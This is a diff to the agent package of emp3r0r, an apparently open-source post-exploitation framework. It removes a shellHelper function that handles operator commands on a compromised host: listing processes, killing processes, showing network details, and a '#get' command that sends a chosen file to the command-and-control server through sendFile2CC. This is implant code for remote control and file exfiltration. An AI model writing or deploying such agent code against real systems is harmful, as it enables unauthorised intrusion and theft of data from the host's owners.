@@ -5,7 +5,6 @@ package agent
 import (
 	"encoding/json"
 	"fmt"
-	"log"
 	"os"
 	"strconv"
 	"strings"
@@ -13,55 +12,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
-
-// shellHelper ps and kill and other helpers
-func shellHelper(cmdSlice []string) (out string) {
-	cmd := cmdSlice[0]
-	args := cmdSlice[1:]
-	var err error
-
-	switch cmd {
-	case "#ps":
-		// Usage: #ps
-		// Lists all running processes.
-		out, err = shellPs()
-		if err != nil {
-			out = fmt.Sprintf("Failed to ps: %v", err)
-		}
-	case "#kill":
-		// Usage: #kill <pid>...
-		// Kills the specified processes.
-		out, err = shellKill(args)
-		if err != nil {
-			out = fmt.Sprintf("Failed to kill: %v", err)
-		}
-	case "#net":
-		// Usage: #net
-		// Displays network information.
-		out = shellNet()
-	case "#get":
-		// Usage: #get <filepath> <offset> <token>
-		// Downloads a file from the agent starting at the specified offset.
-		filepath := args[0]
-		offset, err := strconv.ParseInt(args[1], 10, 64)
-		if err != nil {
-			out = fmt.Sprintf("Invalid offset: %v", err)
-			return
-		}
-		token := args[2]
-		log.Printf("File download: %s at %d with token %s", filepath, offset, token)
-		err = sendFile2CC(filepath, offset, token)
-		out = fmt.Sprintf("%s has been sent, please check", filepath)
-		if err != nil {
-			log.Printf("#GET: %v", err)
-			out = filepath + err.Error()
-		}
-	default:
-		out = "Unknown helper"
-	}
-
-	return
-}
 
 func shellNet() (out string) {
 	ipa := tun.IPa()
